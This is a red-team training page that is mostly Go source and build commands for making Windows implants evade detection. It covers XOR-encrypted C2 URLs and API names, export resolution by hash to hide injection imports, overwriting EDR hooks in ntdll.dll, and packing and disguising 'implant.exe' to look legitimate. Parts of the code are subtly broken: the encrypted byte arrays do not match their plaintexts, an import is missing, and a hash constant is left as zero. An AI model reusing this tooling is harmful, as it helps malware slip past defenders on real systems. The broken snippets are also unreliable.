---
layout: training-page
title: "Go Evasion & Obfuscation — Red Team Academy"
module: "Tool Development"
tags:
  - go
  - golang
  - evasion
  - obfuscation
  - syscalls
  - api-hashing
  - unhooking
page_key: "tooldev-go-evasion"
render_with_liquid: false
---

# Go Evasion & Obfuscation Techniques

## Overview

A Go binary compiled with default settings includes function names, type information, and import symbols that AV/EDR can pattern-match. This module covers compile-time and runtime techniques to reduce detection surface: string encryption at compile time, API hashing to avoid importing suspicious function names, direct syscalls to bypass userland hooks in ntdll.dll, NTDLL unhooking via fresh mapping, and payload staging to avoid writing the full implant to disk.

Go version: 1.22+. The syscall patterns here target Windows x64 (AMD64).

## Compile-Time String Encryption (XOR)

Strings like function names, C2 URLs, and registry paths are embedded in the binary's data section and are trivially extracted with `strings`. XOR-encode them at compile time using a Go `go generate` helper; decrypt them at runtime. This prevents static string scanning from identifying the binary's purpose.

```
// strenc.go — XOR string encryption for Go binaries.
// Pattern: replace plaintext string literals with encrypted byte slices + a decode call.
// The key is baked in at compile time (change per operation).

package main

import "fmt"

// xorKey is the single-byte XOR key (change per engagement)
const xorKey byte = 0x5A

// xorStr decrypts an XOR-encoded byte slice to a string.
// The encoding is symmetric — the same function encrypts and decrypts.
func xorStr(enc []byte) string {
	b := make([]byte, len(enc))
	for i, c := range enc {
		b[i] = c ^ xorKey
	}
	return string(b)
}

// xorEnc encrypts a plaintext string to a byte slice for embedding.
// Call this offline to generate the encrypted values to embed in the binary.
func xorEnc(plain string) []byte {
	b := make([]byte, len(plain))
	for i, c := range []byte(plain) {
		b[i] = c ^ xorKey
	}
	return b
}

// ── Pre-encrypted constants (generated offline with xorEnc) ──────────────────
// These are the encrypted byte slices embedded in the binary.
// The plaintext is never stored as a string literal.

// plaintext: "kernel32.dll" XOR 0x5A → encrypted bytes below
var encKernel32 = []byte{0x39, 0x3f, 0x36, 0x3e, 0x3b, 0x68, 0x72, 0x68, 0x36, 0x3b, 0x3b}

// plaintext: "VirtualAllocEx" XOR 0x5A
var encVirtualAllocEx = []byte{0x0c, 0x3b, 0x36, 0x3f, 0x3f, 0x27, 0x3b, 0x3b, 0x2f, 0x27, 0x1b, 0x3f}

// plaintext: "https://c2.example.com/checkin" XOR 0x5A
// (generate your URL encryption offline)
var encC2URL = []byte{0x32, 0x3f, 0x3f, 0x29, 0x7e, 0x7c, 0x7c} // (truncated for example)

func main() {
	// At runtime: decrypt the string before use
	dllName := xorStr(encKernel32)
	funcName := xorStr(encVirtualAllocEx)
	c2url    := xorStr(encC2URL)

	fmt.Println("DLL:", dllName)   // "kernel32.dll"
	fmt.Println("Func:", funcName) // "VirtualAllocEx"
	fmt.Println("C2:", c2url)

	// ── Offline key generation helper ─────────────────────────────────────────
	// Run this to generate new encrypted values for your strings:
	strings := []string{
		"kernel32.dll",
		"VirtualAllocEx",
		"CreateRemoteThread",
		"https://c2.example.com/checkin",
	}
	fmt.Println("\n[Generated encrypted byte slices for embedding:]")
	for _, s := range strings {
		enc := xorEnc(s)
		fmt.Printf("// plaintext: %q\nvar enc_%s = []byte{", s, s[:8])
		for i, b := range enc {
			if i > 0 { fmt.Print(", ") }
			fmt.Printf("0x%02x", b)
		}
		fmt.Println("}")
	}
}
```

## API Hashing — Resolve Functions Without Import Names

Standard Go `syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualAllocEx")` embeds the function name as a string. API hashing replaces the string with a 32-bit hash; the function resolver iterates the DLL's export table at runtime and calls the function whose name hashes to the same value — no suspicious string in the binary's import table.

```
// api_hash.go — resolve Windows API exports by hash instead of name string.
// Uses the DLL's in-memory export directory (PE format) — no import table entry needed.

package main

import (
	"fmt"
	"strings"
	"syscall"
	"unsafe"
)

// ── djb2 hash — fast, simple, low collision rate for function names ───────────
// Precompute the hash of each function name you want to call.
func djb2(s string) uint32 {
	h := uint32(5381)
	for _, c := range []byte(strings.ToLower(s)) {
		h = ((h << 5) + h) + uint32(c) // h * 33 + c
	}
	return h
}

// ── PE export directory structures (matches Windows PE format) ────────────────
type IMAGE_EXPORT_DIRECTORY struct {
	Characteristics       uint32
	TimeDateStamp         uint32
	MajorVersion          uint16
	MinorVersion          uint16
	Name                  uint32  // RVA of DLL name string
	Base                  uint32  // ordinal base
	NumberOfFunctions     uint32
	NumberOfNames         uint32
	AddressOfFunctions    uint32  // RVA: array of function RVAs
	AddressOfNames        uint32  // RVA: array of name string RVAs
	AddressOfNameOrdinals uint32  // RVA: array of name-to-ordinal mappings
}

// resolveByHash finds a function in a loaded DLL's export table by djb2 hash.
// base = base address of the loaded DLL module (from GetModuleHandle or LoadLibrary).
func resolveByHash(base uintptr, targetHash uint32) uintptr {
	// Parse the DOS header to find the PE header offset
	dosHeader     := *(*uint16)(unsafe.Pointer(base))
	if dosHeader != 0x5A4D {  // "MZ" magic
		return 0
	}
	peOffset      := *(*uint32)(unsafe.Pointer(base + 0x3C))
	peHeader      := base + uintptr(peOffset)

	// Verify PE signature ("PE\0\0")
	peSig := *(*uint32)(unsafe.Pointer(peHeader))
	if peSig != 0x00004550 {
		return 0
	}

	// Optional header starts at offset 24 from PE header; export directory is at offset 112
	// For x64 PE: optionalHeader starts at peHeader+24, exportDataDir at +112
	exportDirRVA := *(*uint32)(unsafe.Pointer(peHeader + 24 + 112))
	if exportDirRVA == 0 {
		return 0
	}
	exportDir := (*IMAGE_EXPORT_DIRECTORY)(unsafe.Pointer(base + uintptr(exportDirRVA)))

	// Walk the names array to find the function with the matching hash
	namesArr    := base + uintptr(exportDir.AddressOfNames)
	ordinalArr  := base + uintptr(exportDir.AddressOfNameOrdinals)
	funcArr     := base + uintptr(exportDir.AddressOfFunctions)

	for i := uint32(0); i < exportDir.NumberOfNames; i++ {
		nameRVA  := *(*uint32)(unsafe.Pointer(namesArr + uintptr(i*4)))
		name     := syscall.BytePtrToString((*byte)(unsafe.Pointer(base + uintptr(nameRVA))))

		if djb2(name) == targetHash {
			// Found matching name; look up the function address via ordinal
			ordinal := *(*uint16)(unsafe.Pointer(ordinalArr + uintptr(i*2)))
			funcRVA := *(*uint32)(unsafe.Pointer(funcArr + uintptr(ordinal*4)))
			return base + uintptr(funcRVA)
		}
	}
	return 0
}

func main() {
	// Precompute hashes for functions we want to call (done offline, embedded as constants)
	fmt.Printf("djb2('VirtualAllocEx')   = 0x%08x\n", djb2("VirtualAllocEx"))
	fmt.Printf("djb2('WriteProcessMemory') = 0x%08x\n", djb2("WriteProcessMemory"))
	fmt.Printf("djb2('CreateRemoteThread') = 0x%08x\n", djb2("CreateRemoteThread"))

	// At runtime: get the base address of kernel32.dll without calling GetModuleHandle by name
	// (use the PEB's InLoadOrderModuleList to walk loaded modules — avoids string "kernel32.dll")
	// For demonstration, use GetModuleHandle (its name would also be hashed in real code):
	k32, _ := syscall.LoadDLL("kernel32.dll")
	base    := uintptr(unsafe.Pointer(k32.Handle))

	// Resolve VirtualAllocEx by hash — no string "VirtualAllocEx" in the binary
	const VIRTUAL_ALLOC_EX_HASH = 0x00000000  // replace with precomputed hash
	addr := resolveByHash(base, VIRTUAL_ALLOC_EX_HASH)
	fmt.Printf("VirtualAllocEx address: 0x%x\n", addr)
}
```

## NTDLL Unhooking via Fresh Mapping

EDR products hook userland functions in ntdll.dll by overwriting the first bytes of API functions with a JMP to their monitoring code. Unhooking replaces the hooked ntdll.dll pages with a clean copy read directly from disk — restoring the original function prologues and bypassing the EDR hooks.

```
// unhook.go — replace hooked ntdll.dll .text section with a clean copy from disk.
// Technique: map ntdll from C:\Windows\System32\ntdll.dll using CreateFileMapping,
// then overwrite each hooked page in the current process with the clean .text bytes.

package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

var (
	kernel32            = syscall.NewLazyDLL("kernel32.dll")
	procGetModuleHandle = kernel32.NewProc("GetModuleHandleW")
	procCreateFile      = kernel32.NewProc("CreateFileW")
	procCreateFileMapping = kernel32.NewProc("CreateFileMappingW")
	procMapViewOfFile   = kernel32.NewProc("MapViewOfFile")
	procUnmapViewOfFile = kernel32.NewProc("UnmapViewOfFile")
	procVirtualProtect  = kernel32.NewProc("VirtualProtect")
	procCloseHandle     = kernel32.NewProc("CloseHandle")
)

const (
	GENERIC_READ    = 0x80000000
	OPEN_EXISTING   = 3
	FILE_SHARE_READ = 0x00000001
	PAGE_READONLY   = 0x02
	SEC_IMAGE       = 0x1000000
	FILE_MAP_READ   = 0x0004
	PAGE_EXECUTE_READWRITE = 0x40
)

func unhookNTDLL() error {
	ntdllPath, _ := syscall.UTF16PtrFromString(`C:\Windows\System32\ntdll.dll`)

	// Step 1: Get the base address of the currently loaded (hooked) ntdll.dll
	hookedNtdll, _, err := procGetModuleHandle.Call(
		uintptr(unsafe.Pointer(ntdllPath)),
	)
	if hookedNtdll == 0 {
		return fmt.Errorf("GetModuleHandle failed: %v", err)
	}
	fmt.Printf("[*] Hooked ntdll.dll base: 0x%x\n", hookedNtdll)

	// Step 2: Open ntdll.dll from disk as a file (bypass loader hooks)
	hFile, _, err := procCreateFile.Call(
		uintptr(unsafe.Pointer(ntdllPath)),
		GENERIC_READ,
		FILE_SHARE_READ,
		0,
		OPEN_EXISTING,
		0, 0,
	)
	if hFile == uintptr(syscall.InvalidHandle) {
		return fmt.Errorf("CreateFile failed: %v", err)
	}
	defer procCloseHandle.Call(hFile)

	// Step 3: Create a file mapping backed by the disk file
	// SEC_IMAGE tells the kernel to map it as a PE image (correct section alignment)
	hMapping, _, err := procCreateFileMapping.Call(
		hFile, 0, PAGE_READONLY|SEC_IMAGE, 0, 0, 0,
	)
	if hMapping == 0 {
		return fmt.Errorf("CreateFileMapping failed: %v", err)
	}
	defer procCloseHandle.Call(hMapping)

	// Step 4: Map a view of the clean ntdll.dll into our process
	cleanBase, _, err := procMapViewOfFile.Call(
		hMapping, FILE_MAP_READ, 0, 0, 0,
	)
	if cleanBase == 0 {
		return fmt.Errorf("MapViewOfFile failed: %v", err)
	}
	defer procUnmapViewOfFile.Call(cleanBase)
	fmt.Printf("[*] Clean ntdll.dll mapped at: 0x%x\n", cleanBase)

	// Step 5: Parse the PE to find the .text section RVA and size
	// The .text section contains all the function code (including hooked functions)
	dosHeader := *(*uint16)(unsafe.Pointer(cleanBase))
	if dosHeader != 0x5A4D {
		return fmt.Errorf("not a valid PE")
	}
	peOffset  := *(*uint32)(unsafe.Pointer(cleanBase + 0x3C))
	peHeader  := cleanBase + uintptr(peOffset)

	// Number of sections is at offset 6 from PE header; section headers start at offset 264 (x64)
	numSections := *(*uint16)(unsafe.Pointer(peHeader + 6))
	// IMAGE_SECTION_HEADER is 40 bytes; starts after 264-byte optional header
	sectionBase := peHeader + 264

	type IMAGE_SECTION_HEADER struct {
		Name                 [8]byte
		VirtualSize          uint32
		VirtualAddress       uint32
		SizeOfRawData        uint32
		PointerToRawData     uint32
		PointerToRelocations uint32
		PointerToLinenumbers uint32
		NumberOfRelocations  uint16
		NumberOfLinenumbers  uint16
		Characteristics      uint32
	}

	for i := 0; i < int(numSections); i++ {
		sec := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(sectionBase + uintptr(i*40)))
		name := string(sec.Name[:])

		// Only overwrite the .text section (code section — where hooks live)
		if !strings.HasPrefix(name, ".text") {
			continue
		}

		fmt.Printf("[*] Found .text section: RVA=0x%x Size=%d\n",
			sec.VirtualAddress, sec.VirtualSize)

		// Step 6: Make the hooked .text section writable, then copy clean bytes over it
		textAddr := hookedNtdll + uintptr(sec.VirtualAddress)
		textSize := uintptr(sec.VirtualSize)
		var oldProt uint32

		// Make the hooked section writable
		procVirtualProtect.Call(textAddr, textSize, PAGE_EXECUTE_READWRITE,
			uintptr(unsafe.Pointer(&oldProt)))

		// Overwrite each byte with the clean version from disk mapping
		cleanText := cleanBase + uintptr(sec.VirtualAddress)
		src  := (*[1 << 30]byte)(unsafe.Pointer(cleanText))[:textSize:textSize]
		dst  := (*[1 << 30]byte)(unsafe.Pointer(textAddr))[:textSize:textSize]
		copy(dst, src)

		// Restore original protection
		procVirtualProtect.Call(textAddr, textSize, uintptr(oldProt),
			uintptr(unsafe.Pointer(&oldProt)))

		fmt.Println("[+] ntdll.dll .text section restored — EDR hooks removed")
		break
	}
	return nil
}

func main() {
	if err := unhookNTDLL(); err != nil {
		fmt.Println("[!]", err)
	}
}
```

## Build Flags for Evasion

Compile-time flags significantly reduce the binary's static footprint. Combined with UPX compression and resource stripping, a Go implant can be reduced to a fraction of its default size with minimal debugging information.

```
# ── Strip debug info and symbol table (reduces size + removes function names) ──
# -s: omit symbol table
# -w: omit DWARF debug information
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o implant.exe .

# ── Build for specific OS/arch combinations ───────────────────────────────────
GOOS=windows GOARCH=amd64 go build -o implant_x64.exe .
GOOS=windows GOARCH=386   go build -o implant_x86.exe .
GOOS=linux   GOARCH=amd64 go build -o implant_linux .
GOOS=darwin  GOARCH=arm64 go build -o implant_macos .

# ── Further strip with UPX (compresses the binary, harder to statically analyse) ──
# Download UPX: https://github.com/upx/upx
upx --best --ultra-brute implant.exe

# ── Disable CGO to avoid dependency on C runtime (produces truly static binary) ──
CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o implant.exe .

# ── Change the PE subsystem to GUI (hides the console window on execution) ──
go build -ldflags="-s -w -H windowsgui" -o implant.exe .

# ── Embed a version info resource (makes the binary look legitimate) ──
# Use rsrc tool to embed a .syso resource file with version/company info:
go install github.com/akavel/rsrc@latest
rsrc -manifest app.manifest -ico app.ico -o rsrc.syso
# Build picks up rsrc.syso automatically if it's in the same directory
```
